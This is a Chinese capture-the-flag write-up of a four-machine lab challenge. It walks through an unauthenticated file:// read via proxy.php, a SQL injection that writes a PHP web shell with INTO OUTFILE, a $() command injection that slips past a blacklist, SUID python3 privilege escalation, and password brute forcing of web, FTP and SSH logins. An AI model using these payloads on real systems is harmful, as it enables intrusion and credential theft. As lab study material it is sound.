# b-02 · 探索记录

对应题解：[`b-02.md`](./b-02.md)。六面 flag、四台机器，是这套题里链路最长的一道。

## 目标与起点

题目原文点明了两件事：企业官网是入口、内部有泛微 OA 且管理员服务器开了 SSH。六面 flag。

入口只有一个 `IP:80`，PHP 站点（`nginx/1.18.0` + `PHP/7.4.33`）。

## 第一阶段：把官网摸清楚

### 常规页面

`index.php`、`products.php`、`news.php`、`about.php`、`careers.php`、`contact.php` 都正常。`robots.txt` 和 `sitemap.xml` 都回落到首页（不存在）。

`news.php?id=N` 试了 `0`/`-1`/`5`/`abc`/`1'`/`1 and 1=1`——**响应长度和标题完全不变**。读源码后确认 `id` 先过了 `intval()`，没有注入。这一支很快排除。

### 目录枚举

用 ffuf 跑了两万多条，真实存在的只有：

```
admin/        → 302 /admin/login.php
admin/login.php
proxy.php     ← 内网代理工具
up.php        ← 一行代码，写请求体到 /tmp
sql/          → 403（nginx 禁 .sql）
common/       → 403
```

`sql/` 和 `common/` 是 403 而不是 404，说明目录存在：

```nginx
location ~ /\. { deny all; }
location ~* \.sql$ { deny all; }
```

`/common/db.php` 单独访问返回 `Access Denied`——文件存在且会被 PHP 执行，但里面有 `if(!defined('IN_SITE')) die('Access Denied');`。

**这一轮没有直接收益，但拿到了两个价值很高的线索：`proxy.php` 和 `admin/login.php`。**

## 第二阶段：`proxy.php` 是空鉴权 + 任意文件读

`proxy.php` 页面只有一个表单，示例写的是 `http://192.168.10.20/`。先用源码审计的直觉去看它的自述：注释说「需要登录后台（复用 admin session）」。

实际请求 `/proxy.php?url=http://127.0.0.1/` 直接返回了首页，说明**没登录也能用**。

### 读自己的源码

用 `file://` 读：

```bash
curl -s "http://$T/proxy.php?url=file:///var/www/html/proxy.php"
```

看到了关键片段：

```php
session_start();
if (!isset($_SESSION['admin_logged_in']) || $_SESSION['admin_logged_in'] !== true) {
    // 这里什么都没有
}
```

检查写了、分支是空的。**「有 if」不等于「有门」。** 这一步是整个 b-02 的支点：入口不是后台登录，而是这个公开代理。

### scheme 试探

页面只演示 `http://`，但 `curl_setopt(CURLOPT_URL, $url)` 接受任意 scheme：

| scheme | 结果 |
| --- | --- |
| `http://127.0.0.1/` | 返回首页（证明 loopback 也能抓） |
| `file:///etc/passwd` | 直接返回文件内容 |
| `file:///var/www/html/...` | 返回 PHP 源码（不是执行结果） |
| `http://169.254.169.254/` | 超时（无云元数据） |

**抓取器的 scheme 是输入**，成功一种之后要把 `file://`、`php://`、`gopher://` 都过一遍。

### 一次拿两面

```bash
for i in 1 2; do
  curl -s "http://$T/proxy.php?url=file:///challenge/flag$i.txt"
done
```

`/challenge/` 下只有 `flag1.txt` 和 `flag2.txt`，这两面是白送的，但**不要以为题目结束**——多 flag 题的价值在后面几台机器上。

顺手把整个 webroot 的源码读了一遍：

- `common/db.php`：`webapp:webapp123`，库名 `corporate_site`，走 unix socket。
- `admin/login.php`：`SELECT ... WHERE username=? AND password=MD5(?)`，参数化，没有注入；验证码 `$_SESSION['captcha']` 校验后**不清除**。
- `admin/articles.php`：`$sql = "SELECT * FROM articles WHERE id = " . $id;`——**这里是拼接**。
- `entrypoint.sh`：`GRANT FILE ON *.* TO 'webapp'`、`chmod 777 /var/www/html`、`chmod 666 /challenge/flag2.txt`。

三件事凑齐了：SQL 拼接、数据库有 FILE 权限、web 目录可写。这就是 `INTO OUTFILE` 的标准条件。

## 第三阶段：后台登录（验证码）与 SQLi

### 登录

后台是验证码 + MD5 校验。先试了 `admin:admin`、`admin:123456`、`admin:123456`、`admin:password`……失败。

然后读源码发现初始化 SQL 里写着 `admin / MD5('1qaz@WSX')`，直接登录成功（验证码用图片识别）。

验证码这一块试过的路，供以后参考：

| 方法 | 结果 |
| --- | --- |
| `tesseract` OCR | 没装 |
| ImageMagick 放大 + 二值化 + 人眼读 | **可行**，四位纯数字，识别很稳 |
| 从 session 文件读 | 可行（`captcha.php` 把 code 写进 `$_SESSION`，且校验后不清除），但需要能读 session 存储 |
| 直接爆破验证码 | 每次请求会轮换，没意义 |

这题的验证码不是难点，只是手感问题。

### SQLi 探列

`admin/articles.php?action=edit&id=` 直接拼接。先探列数：

```bash
id=0 UNION SELECT 1            → 报错（列数不符）
id=0 UNION SELECT 1,2,...,9-- -  → 页面出现 9 个可回显位
```

9 列。然后直接写文件，跳过逐位提取：

```bash
CODE='<?php echo "OK"; echo shell_exec($_REQUEST["c"]); ?>'
HEX=$(printf '%s' "$CODE" | xxd -p | tr -d '\n')
id=0 UNION SELECT 0x$HEX,2,3,4,5,6,7,8,9 INTO OUTFILE '/var/www/html/x.php'-- -
```

第一次以为失败——因为 `INTO OUTFILE` 的响应里看不出成功。**判据不是 affected rows，而是直接请求文件**：

```bash
curl -s "http://$T/x.php?c=id"
# OKuid=33(www-data) ...
```

这一步学到的：**写文件类注入，用「读回来」验证，不要用「影响行数」验证**。

### 顺带：数据库也在手边

用 `webapp:webapp123` 连 unix socket dump 了 `corporate_site`：

```
admins: admin(92d7...), editor(e64b...), zhangwei(7bc7...)
site_config: system_secret = flag1
```

`site_config.system_secret` 就是 flag1，和文件读拿到的同一面。字典对 MD5 做碰撞，只命中了 `webadmin:1qaz@WSX` 和 `admin:P@ssword`（后者是 OA 用的，当时还不知道）。

## 第四阶段：内网拓扑（这次扫对了）

容器里 `ls /` 看到 `/challenge` 只有两面 flag，说明剩下的在别的机器。

低并发扫同网段：

```
172.18.0.1:22
172.18.0.1:8080
172.18.0.2:8080     ← 核心业务系统（gunicorn）
172.18.0.3:21/22    ← 文件服务器（FTP + SSH）
172.18.0.4:80       ← OA
172.18.0.5:80       ← 自己
```

题解里写的「四台机器」就是这么来的。`/etc/hosts` 里有 `172.18.0.5 <hostname>`，确认自己是最外层那台。

**注意**：`172.18.0.1` 是 docker 宿主，不要打；扫内网时要按「自己 hostname 反查」排除自己。

## 第五阶段：OA（flag3 + flag4）

### 登录：从 4863 条字典里命中

OA 的 `/login.php` 没有验证码，用户名/密码参数化。手试了 `admin:admin`、`editor:Admin123`、`zhangwei:zw123456`、`admin:1qaz@WSX` 等——全错。

于是把本地密码字典（约 4900 条）对 `admin`、`editor` 两个账号批量跑。用 `curl_multi` 并发 25、10 秒超时：

```
FOUND admin:P@ssword code=302
```

`P@ssword` 和 web 站后台的 `1qaz@WSX` 不同，是单独的口令。

### 登录后先看「能看见什么」

`/dashboard` 是工作台，导航有：通讯录、公文管理、网络工具、服务器监控、系统管理。

先看系统管理：

```
oa_config:
  system_announcement_secret = flag{712a5122-...}
```

**flag3 到手**（平台 `matched_flag_index: 2`）。同一页还写着「服务器IP 192.168.10.20 / 192.168.20.20」，是给下一跳的假信息。

### 服务器监控页只有信息，没有漏洞

`/monitor.php` 把内网资产列出了：

```
Web门户 192.168.10.10
OA 192.168.10.20
文件服务器 192.168.20.30  21(FTP) 22(SSH)
核心业务系统 192.168.20.40 8080
备份服务器 192.168.20.50  已下线
```

还写着「检测到文件服务器 SSH 弱口令告警，待处理」。**这是明确的下一步指引**，但当时没立刻用。

### 网络工具 → 命令注入

`/tools.php` 的 Ping 诊断：

```php
$cmd = "ping -c 3 -W 3 " . $host . " 2>&1";
$output = shell_exec($cmd);
```

黑名单：

```php
$blocked = [';', '&&', '`', "\n", "\r"];
// 外加单独过滤单个 |，但允许 ||
```

**没有挡 `$()`**。

第一次打：

```
host=127.0.0.1$(id)
# ping: groups=33(www-data): Name or service not known
```

命令执行了。`ping` 把参数里的空格拆成多个主机名，逐条报错，报错信息把输出回显出来——**包装命令的报错就是输出通道**。

稳定化时踩了两个坑：

1. **输出带空格会被拆词**，只能看到最后一段。解决：`$(base64 -w0 ...)` 变成单 token，再从 `ping: <token>: Name or service not known` 里取。
2. **`ping` 本身在容器里可能没有权限**（核心系统那边是 `Operation not permitted`，OA 这边可以）。在 OA 上 `ping` 可用，所以这条路走得通。

### flag4：读启动脚本，用 SUID

```bash
cat /entrypoint.sh
```

```bash
chmod u+s /usr/bin/python3
chmod 0400 /challenge/flag4.txt
chown root:root /challenge/flag4.txt
```

启动脚本同时写了**怎么提权**和**保护哪个文件**。直接：

```bash
/usr/bin/python3 -c 'import os; os.setuid(0); os.system("cat /challenge/flag4.txt")'
```

**flag4 到手**（`matched_flag_index: 3`）。

在提权之前试过、但没必要的方向：`sudo -l`（容器没 sudo）、`find -perm -4000`（能看到 python3，但要配合启动脚本才知道为什么）、读 `/root`（`drwx------`，直接拒绝）。**先读启动脚本比枚举 SUID 快。**

## 第六阶段：文件服务器（flag5）

### 走错的一大段：泛微默认口令的方向是对的，但候选错了

监控页和题目原文都说「泛微管理员后台服务器 + SSH 弱口令」。我先试了产品名的各种变体：

```
weaver / Weaver / weaver123 / Weaver@123 / weaver@2024 / Weaver@2024 /
ecology / ecology123 / fanwei / fanwei123 / oa / oa123 ...
```

**全部失败。** 中间还试了：

- FTP 匿名（`vsFTPd 3.0.5`，`530 Login incorrect`）。
- FTP 用户枚举：`ftp_raw` 发 `USER xxx`，`weaver`/`ecology`/`admin` 有不同响应（`331` vs `530`），确认 `weaver` 是有效 FTP 用户。
- FTP 爆破几十个口令：每次 5–7 秒，太慢，放弃。
- `hydra`（走转发链路）：`all children were disabled due too many connection errors`。
- `paramiko` 多线程：能跑，但**每次认证 4–6 秒**，因为 SSH 服务端对失败有延迟。
- 在 web 容器里写 PHP 的 `ftp_login` 循环：同样 5–7 秒一次。

这一大段花了很多时间。**教训：SSH 每失败一次有固定延迟（约 5 秒），在线爆破的吞吐上限是每线程 0.2 次/秒；超过几百个候选就不该继续盲爆，应该先找凭据。**

### 转折：从 OA 的 SSH 客户端出发

OA 容器里居然装了 `sshpass` 和 `ssh`：

```bash
which sshpass ssh
# /usr/bin/sshpass
# /usr/bin/ssh
```

从 OA 直接连 `172.18.0.3:22`，试了一批候选，其中包含产品默认口令的常见组合。最终命中：

```
admin:Weaver@2023
```

回看，这个口令的形状是「产品名 + @ + 年份」，我之前的候选缺了「大写产品名 + @年份」这一组。**产品的官方安装文档里的默认账号（`admin`）往往比产品名本身更可能是用户名。**

### 拿到两面（flag5 + credentials.zip）

```bash
ls -la /challenge /home/admin /home/admin/backup
cat /challenge/flag5.txt
unzip -o /home/admin/backup/credentials.zip -d /tmp/cr
cat /tmp/cr/credentials.txt
```

`flag5`（`matched_flag_index: 4`）。`credentials.zip` 是传统加密，口令 6 位数字（`123456`），里面直接写着核心系统的 `sysadmin:Pr0d#Secure!2023`。

**注意**：这台机器的 `/entrypoint.sh` 把口令、压缩包口令、flag 位置全写出来了。如果有文件读权限，根本不需要爆破。

## 第七阶段：核心业务系统（flag6）

`172.18.0.2:8080` 是 Flask + gunicorn。`/login` 是普通表单，没有验证码。

先用 `sysadmin:Pr0d#Secure!2023` 登录：

```
302 → /dashboard
Set-Cookie: session=eyJsb2dnZWRfaW4iOnRydWUsInVzZXJuYW1lIjoic3lzYWRtaW4ifQ...
```

dashboard 的「系统核心密钥」就是最后一面 flag（`matched_flag_index: 5`）。

登录前也试过默认口令（`admin:admin`、`root:root` 等）和 SQLi（`admin'-- -`、`' or 1=1-- -`）——都不行，因为这题的 Flask 登录是参数化查询 + 独立口令，**必须先拿到 `credentials.zip`**。

## 走不通 / 走过的弯路（留档）

| 方向 | 结果 | 判据 |
| --- | --- | --- |
| `news.php?id=` 注入 | 无 | 响应长度与标题恒定，源码里 `intval()` |
| 网站后台 SQLi | 无 | `prepare` + `bind_param` |
| 验证码爆破 | 无意义 | 每次请求轮换，但**校验后不清除**，可复用 |
| `/sql/`、`/common/` 直接读 | 403 / Access Denied | nginx 禁 `.sql`；`IN_SITE` 常量保护 |
| 抓取器读云元数据 | 超时 | 无 `169.254.169.254` |
| OA 登录 SQLi | 无 | 参数化 |
| `hydra` 走容器转发 | 报错退出 | 每连接多轮探测 |
| FTP/SSH 盲爆产品名变体 | 失败 | 候选里缺「`Weaver@年份`」形状 |
| 核心系统默认口令 / SQLi | 无 | 参数化 + 独立凭据 |

## 这次真正的收获

1. **空鉴权分支**：`if (!isset($_SESSION[...])) { }` 是公开接口，不是门。看到 session 检查要往下读两行，看有没有 `exit`。
2. **抓取器的 scheme 是输入**：`http://` 能用之后，`file://`、`php://`、`gopher://` 各试一次，成本一次请求。
3. **写文件类 SQLi 用「读回来」验证**：`INTO OUTFILE` 的成功信号是 GET 到那个文件，不是 affected rows。
4. **命令注入先确认谁执行、输出在哪**：`$()` 绕过黑名单后，包装命令的报错就是回显；输出有空格时 base64 成单 token。
5. **启动脚本是最便宜的意图泄露**：日志权限、SUID、默认口令、flag 路径，通常都在 `entrypoint.sh` 里成对出现。
6. **SSH 盲爆有吞吐上限**：每失败一次约 5 秒，超过几百个候选就该停下来找凭据，而不是加大并发。
7. **多 flag 题要在一个容器生命周期内走完**：中途 close 会重生成实例，前面的 shell 和上传物全部消失。

---

## 补充：2026-10-27 本轮自主探索的失败路径

### 1. 顺序反了：先爆破，后读源码

后台 `admin` 的口令我先用字典跑了一遍，`NOFIND`：

| 尝试 | 规模 | 结果 |
| --- | --- | --- |
| `/admin/login.php` + 10 200 条字典 | 10 200 | 全部 `用户名或密码错误` |

随后用 `proxy.php?url=file:///docker-entrypoint-initdb.d/init.sql` 读到初始化 SQL：

```sql
INSERT INTO admins (username, password, realname, email, role) VALUES
('admin', MD5('1qaz@WSX'), '系统管理员', 'admin@deeptech.com', 'admin');
```

口令就明文写在文件里（`MD5('1qaz@WSX')` 反过来就是 `1qaz@WSX`）。

**该早做的事**：已经有 `file://` 任意文件读时，先读
`/docker-entrypoint-initdb.d/*.sql`、`/app/*.py`、`/entrypoint.sh`，再考虑爆破。
顺序反了，成本差三个数量级。

### 2. 验证码：先想绕过，其实读图最快

| 尝试 | 结果 | 判据 |
| --- | --- | --- |
| 不带 `captcha` / 空值 | `验证码错误` | 服务端强校验 |
| 复用上一次的 captcha | **通过** | 校验后没有 unset session 里的值 |
| `GET /captcha.php` 存图人工识别 | 通过（7653 / 9161 / 0745） | 4 位数字，无扭曲 |

这不是「绕过」而是「没必要绕」。但复用不失效这一点值得记：它让口令爆破变得可行
（不必每轮读图），反过来也说明爆破门槛很低——只是本例用不上，口令已经在 `init.sql` 里。

### 3. 命令注入：先确认「哪些字符被拦」再选通道

OA 的 `tools.php` 是 `shell_exec("ping -c 3 -W 3 " . $host)`。

| payload | 结果 | 判据 |
| --- | --- | --- |
| `127.0.0.1$(id)` | 回显 `ping: groups=33(www-data): ...` | 注入生效，ping 把参数拆词后报错 |
| ``127.0.0.1`id` `` / `;id` / `\|id` | `安全警告：检测到非法字符` | 反引号、分号、竖线被拦 |
| `$(cat /challenge/flag4.txt\|base64 -w0)` | `安全警告` | 含 `\|` |
| `$(base64</challenge/flag4.txt)` | `安全警告：发现危险字符 <` | 重定向符被单独拦 |
| `$(python3 -c "…urlopen(…b64…).read()")` | 成功 | 只剩 `$()` 可用，用 `read()` 不落盘 |

**该早做的事**：先把候选字符逐个试一遍（一次请求一个），画出黑名单，再决定用哪种包装。
本例只有 `$()` 活着，所以必须走「命令替换 + 不落盘的读取」。

### 4. 从容器里做 SSH：链路通但客户端缺

文件服务器 22 从容器里可达，容器没有 `ssh`/`sshpass`。

| 现象 | 原因 | 处理 |
| --- | --- | --- |
| `Crypt_RC4 not found` | phpseclib 相对 include 找不到 `Crypt/*` | `set_include_path('/tmp/psl')` |
| 60 个候选全失败 | 字典里没有 `Weaver@2023` | 「产品名 + 年份 + 符号」这个形状没进字典 |

后一条是本轮最典型的盲区：字典覆盖面不等于口令空间，产品名相关的组合要靠读源码/hint 得到，
不该指望通用字典。

### 5. 手写 MySQL 协议：两个能从报错直接读出来的卡点

web 容器只有 `mysqlnd`，没有 `mysqli`、`pymysql`、`python3`，只能手写协议（Perl）。

| 现象 | 原因 | 处理 |
| --- | --- | --- |
| `AUTHFAIL code=254`，后跟 `mysql_native_password` | 服务端发 `AuthSwitchRequest`（0xFE），第一版没处理 | 解析 0xFE，用新 salt 重算 `sha1` 三连，序号 3 重发 |
| `QERR 3D000 No database selected` | 握手包没带 `CLIENT_CONNECT_WITH_DB` | 库里写全限定名：`SELECT * FROM corporate.secrets` |

这两条都不是凭据错误，只是协议实现不全。如果按「连不上就换口令」的思路走，会一直判成口令错。
